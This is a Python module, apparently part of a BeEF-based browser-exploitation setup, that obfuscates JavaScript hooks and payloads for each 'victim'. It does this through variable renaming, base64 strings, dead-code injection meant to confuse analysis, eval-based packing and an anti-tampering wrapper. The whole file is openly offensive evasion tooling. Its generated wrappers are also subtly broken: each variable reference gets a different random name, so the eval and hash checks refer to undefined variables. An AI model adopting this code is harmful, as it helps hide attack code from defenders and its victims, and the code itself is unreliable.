"""
Dynamic Obfuscator
Advanced code obfuscation techniques for BeEF hooks and payloads
"""

import os
import json
import base64
import secrets
import time
import hashlib
import zlib
from datetime import datetime, timezone, timedelta
from typing import Dict, Optional, Any, List, Tuple
import logging
import re
import threading
import random

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class ObfuscationConfig:
    """Obfuscation configuration"""

    def __init__(self):
        self.enable_variable_obfuscation = os.getenv("ENABLE_VARIABLE_OBFUSCATION", "true").lower() == "true"
        self.enable_string_obfuscation = os.getenv("ENABLE_STRING_OBFUSCATION", "true").lower() == "true"
        self.enable_control_flow_obfuscation = os.getenv("ENABLE_CONTROL_FLOW_OBFUSCATION", "true").lower() == "true"
        self.enable_dead_code_injection = os.getenv("ENABLE_DEAD_CODE_INJECTION", "true").lower() == "true"
        self.enable_encoding_obfuscation = os.getenv("ENABLE_ENCODING_OBFUSCATION", "true").lower() == "true"
        self.enable_packing = os.getenv("ENABLE_PACKING", "true").lower() == "true"
        self.enable_anti_tampering = os.getenv("ENABLE_ANTI_TAMPERING", "true").lower() == "true"
        self.obfuscation_level = int(os.getenv("OBFUSCATION_LEVEL", "3"))  # 1-5

class DynamicObfuscator:
    """Dynamic obfuscator for advanced code obfuscation"""

    def __init__(self, mongodb_connection=None, redis_client=None):
        self.mongodb = mongodb_connection
        self.redis = redis_client

        self.config = ObfuscationConfig()
        self.obfuscation_cache: Dict[str, str] = {}
        self.obfuscation_history: List[Dict[str, Any]] = []

    def obfuscate_code(self, code: str, victim_id: str) -> str:
        """
        Obfuscate JavaScript code with advanced techniques

        Args:
            code: Original JavaScript code
            victim_id: Victim identifier for context

        Returns:
            Obfuscated JavaScript code
        """
        try:
            if not code:
                return code

            # Apply obfuscation techniques based on level
            obfuscated_code = code

            # Level 1: Basic obfuscation
            if self.config.obfuscation_level >= 1:
                obfuscated_code = self._apply_basic_obfuscation(obfuscated_code)

            # Level 2: Variable and string obfuscation
            if self.config.obfuscation_level >= 2:
                if self.config.enable_variable_obfuscation:
                    obfuscated_code = self._obfuscate_variables(obfuscated_code)
                if self.config.enable_string_obfuscation:
                    obfuscated_code = self._obfuscate_strings(obfuscated_code)

            # Level 3: Control flow obfuscation
            if self.config.obfuscation_level >= 3:
                if self.config.enable_control_flow_obfuscation:
                    obfuscated_code = self._obfuscate_control_flow(obfuscated_code)

            # Level 4: Advanced obfuscation
            if self.config.obfuscation_level >= 4:
                if self.config.enable_dead_code_injection:
                    obfuscated_code = self._inject_dead_code(obfuscated_code)
                if self.config.enable_encoding_obfuscation:
                    obfuscated_code = self._apply_encoding_obfuscation(obfuscated_code)

            # Level 5: Packing and anti-tampering
            if self.config.obfuscation_level >= 5:
                if self.config.enable_packing:
                    obfuscated_code = self._apply_packing(obfuscated_code)
                if self.config.enable_anti_tampering:
                    obfuscated_code = self._apply_anti_tampering(obfuscated_code)

            # Cache obfuscated code
            cache_key = f"obfuscated_{victim_id}_{hashlib.md5(obfuscated_code.encode()).hexdigest()[:8]}"
            self.obfuscation_cache[cache_key] = obfuscated_code

            # Record obfuscation history
            self.obfuscation_history.append({
                "victim_id": victim_id,
                "original_size": len(code),
                "obfuscated_size": len(obfuscated_code),
                "obfuscation_level": self.config.obfuscation_level,
                "timestamp": datetime.now(timezone.utc).isoformat()
            })

            logger.info(f"Obfuscated code for victim: {victim_id} (level: {self.config.obfuscation_level})")
            return obfuscated_code

        except Exception as e:
            logger.error(f"Error obfuscating code: {e}")
            return code

    def _apply_basic_obfuscation(self, code: str) -> str:
        """Apply basic obfuscation techniques"""
        try:
            # Remove comments
            code = re.sub(r'//.*?\n', '\n', code)
            code = re.sub(r'/\*.*?\*/', '', code, flags=re.DOTALL)

            # Remove unnecessary whitespace
            code = re.sub(r'\s+', ' ', code)
            code = code.strip()

            # Add random whitespace
            lines = code.split(';')
            obfuscated_lines = []
            for line in lines:
                if line.strip():
                    # Add random spaces
                    spaces = ' ' * random.randint(1, 3)
                    obfuscated_lines.append(line.strip() + spaces)
            
            return ';'.join(obfuscated_lines)

        except Exception as e:
            logger.error(f"Error applying basic obfuscation: {e}")
            return code

    def _obfuscate_variables(self, code: str) -> str:
        """Obfuscate variable names"""
        try:
            # Find variable declarations
            var_pattern = r'\b(var|let|const)\s+(\w+)\b'
            variables = re.findall(var_pattern, code)

            # Create obfuscated variable names
            var_mapping = {}
            for var_type, var_name in variables:
                if var_name not in var_mapping:
                    obfuscated_name = self._generate_obfuscated_name()
                    var_mapping[var_name] = obfuscated_name

            # Replace variable names
            for original_name, obfuscated_name in var_mapping.items():
                # Replace variable declarations
                code = re.sub(r'\b' + original_name + r'\b', obfuscated_name, code)

            return code

        except Exception as e:
            logger.error(f"Error obfuscating variables: {e}")
            return code

    def _obfuscate_strings(self, code: str) -> str:
        """Obfuscate string literals"""
        try:
            # Find string literals
            string_pattern = r'["\']([^"\']*)["\']'
            strings = re.findall(string_pattern, code)

            for string in strings:
                if len(string) > 2:  # Only obfuscate longer strings
                    # Encode string
                    encoded_string = base64.b64encode(string.encode()).decode()
                    
                    # Create obfuscated string
                    obfuscated_string = f"atob('{encoded_string}')"
                    
                    # Replace in code
                    code = code.replace(f'"{string}"', obfuscated_string)
                    code = code.replace(f"'{string}'", obfuscated_string)

            return code

        except Exception as e:
            logger.error(f"Error obfuscating strings: {e}")
            return code

    def _obfuscate_control_flow(self, code: str) -> str:
        """Obfuscate control flow"""
        try:
            # Add dummy if statements
            dummy_ifs = [
                "if(Math.random()<0.5){}",
                "if(Date.now()%2===0){}",
                "if(Math.floor(Math.random()*2)===1){}"
            ]

            # Insert dummy if statements randomly
            lines = code.split(';')
            obfuscated_lines = []
            
            for line in lines:
                if line.strip():
                    obfuscated_lines.append(line.strip())
                    # Randomly add dummy if statement
                    if random.random() < 0.3:  # 30% chance
                        dummy_if = dummy_ifs[random.randint(0, len(dummy_ifs) - 1)]
                        obfuscated_lines.append(dummy_if)

            return ';'.join(obfuscated_lines)

        except Exception as e:
            logger.error(f"Error obfuscating control flow: {e}")
            return code

    def _inject_dead_code(self, code: str) -> str:
        """Inject dead code to confuse analysis"""
        try:
            # Dead code templates
            dead_code_templates = [
                "var _0x{random} = Math.random();",
                "function _0x{random}() {{ return Math.floor(Math.random() * 1000); }}",
                "var _0x{random} = ['a', 'b', 'c', 'd', 'e'];",
                "if(false) {{ console.log('dead code'); }}",
                "var _0x{random} = Date.now() + Math.random();",
                "function _0x{random}() {{ var x = 1; var y = 2; return x + y; }}"
            ]

            # Inject dead code
            lines = code.split(';')
            obfuscated_lines = []
            
            for line in lines:
                if line.strip():
                    obfuscated_lines.append(line.strip())
                    # Randomly inject dead code
                    if random.random() < 0.2:  # 20% chance
                        dead_code = random.choice(dead_code_templates)
                        dead_code = dead_code.replace('{random}', secrets.token_hex(4))
                        obfuscated_lines.append(dead_code)

            return ';'.join(obfuscated_lines)

        except Exception as e:
            logger.error(f"Error injecting dead code: {e}")
            return code

    def _apply_encoding_obfuscation(self, code: str) -> str:
        """Apply encoding obfuscation"""
        try:
            # Encode the entire code
            encoded_code = base64.b64encode(code.encode()).decode()
            
            # Create decoder wrapper
            wrapper = f"""
            (function() {{
                'use strict';
                var _0x{secrets.token_hex(4)} = '{encoded_code}';
                var _0x{secrets.token_hex(4)} = atob(_0x{secrets.token_hex(4)});
                eval(_0x{secrets.token_hex(4)});
            }})();
            """
            
            return wrapper

        except Exception as e:
            logger.error(f"Error applying encoding obfuscation: {e}")
            return code

    def _apply_packing(self, code: str) -> str:
        """Apply packing obfuscation"""
        try:
            # Compress the code
            compressed_code = zlib.compress(code.encode())
            compressed_b64 = base64.b64encode(compressed_code).decode()
            
            # Create unpacker
            unpacker = f"""
            (function() {{
                'use strict';
                var _0x{secrets.token_hex(4)} = '{compressed_b64}';
                var _0x{secrets.token_hex(4)} = atob(_0x{secrets.token_hex(4)});
                var _0x{secrets.token_hex(4)} = new Uint8Array(_0x{secrets.token_hex(4)}.length);
                for (var i = 0; i < _0x{secrets.token_hex(4)}.length; i++) {{
                    _0x{secrets.token_hex(4)}[i] = _0x{secrets.token_hex(4)}.charCodeAt(i);
                }}
                var _0x{secrets.token_hex(4)} = pako.inflate(_0x{secrets.token_hex(4)});
                var _0x{secrets.token_hex(4)} = new TextDecoder().decode(_0x{secrets.token_hex(4)});
                eval(_0x{secrets.token_hex(4)});
            }})();
            """
            
            return unpacker

        except Exception as e:
            logger.error(f"Error applying packing: {e}")
            return code

    def _apply_anti_tampering(self, code: str) -> str:
        """Apply anti-tampering measures"""
        try:
            # Calculate code hash
            code_hash = hashlib.md5(code.encode()).hexdigest()
            
            # Create anti-tampering wrapper
            wrapper = f"""
            (function() {{
                'use strict';
                var _0x{secrets.token_hex(4)} = '{code_hash}';
                var _0x{secrets.token_hex(4)} = `{code}`;
                var _0x{secrets.token_hex(4)} = CryptoJS.MD5(_0x{secrets.token_hex(4)}).toString();
                if (_0x{secrets.token_hex(4)} !== _0x{secrets.token_hex(4)}) {{
                    window.location.href = 'about:blank';
                    return;
                }}
                eval(_0x{secrets.token_hex(4)});
            }})();
            """
            
            return wrapper

        except Exception as e:
            logger.error(f"Error applying anti-tampering: {e}")
            return code

    def _generate_obfuscated_name(self) -> str:
        """Generate obfuscated variable name"""
        try:
            # Generate random variable name
            prefixes = ['_0x', '_', 'a', 'b', 'c', 'd', 'e']
            prefix = random.choice(prefixes)
            
            if prefix == '_0x':
                # Hex-style name
                suffix = secrets.token_hex(random.randint(2, 6))
            else:
                # Random string
                suffix = secrets.token_hex(random.randint(4, 8))
            
            return f"{prefix}{suffix}"

        except Exception as e:
            logger.error(f"Error generating obfuscated name: {e}")
            return f"_0x{secrets.token_hex(4)}"

    def get_obfuscation_statistics(self) -> Dict[str, Any]:
        """Get obfuscation statistics"""
        try:
            total_obfuscations = len(self.obfuscation_history)
            total_size_reduction = 0
            
            if total_obfuscations > 0:
                for record in self.obfuscation_history:
                    size_reduction = record['original_size'] - record['obfuscated_size']
                    total_size_reduction += size_reduction

            return {
                "total_obfuscations": total_obfuscations,
                "cache_size": len(self.obfuscation_cache),
                "obfuscation_level": self.config.obfuscation_level,
                "average_size_reduction": total_size_reduction / total_obfuscations if total_obfuscations > 0 else 0,
                "enabled_features": {
                    "variable_obfuscation": self.config.enable_variable_obfuscation,
                    "string_obfuscation": self.config.enable_string_obfuscation,
                    "control_flow_obfuscation": self.config.enable_control_flow_obfuscation,
                    "dead_code_injection": self.config.enable_dead_code_injection,
                    "encoding_obfuscation": self.config.enable_encoding_obfuscation,
                    "packing": self.config.enable_packing,
                    "anti_tampering": self.config.enable_anti_tampering
                },
                "timestamp": datetime.now(timezone.utc).isoformat()
            }

        except Exception as e:
            logger.error(f"Error getting obfuscation statistics: {e}")
            return {"error": "Failed to get statistics"}

# Global obfuscator instance
obfuscator = None

def initialize_obfuscator(mongodb_connection=None, redis_client=None) -> DynamicObfuscator:
    """Initialize global obfuscator"""
    global obfuscator
    obfuscator = DynamicObfuscator(mongodb_connection, redis_client)
    return obfuscator

def get_obfuscator() -> DynamicObfuscator:
    """Get global obfuscator"""
    if obfuscator is None:
        raise ValueError("Obfuscator not initialized")
    return obfuscator

# Convenience functions
def obfuscate_code(code: str, victim_id: str) -> str:
    """Obfuscate code (global convenience function)"""
    return get_obfuscator().obfuscate_code(code, victim_id)

def get_obfuscation_statistics() -> Dict[str, Any]:
    """Get obfuscation statistics (global convenience function)"""
    return get_obfuscator().get_obfuscation_statistics()
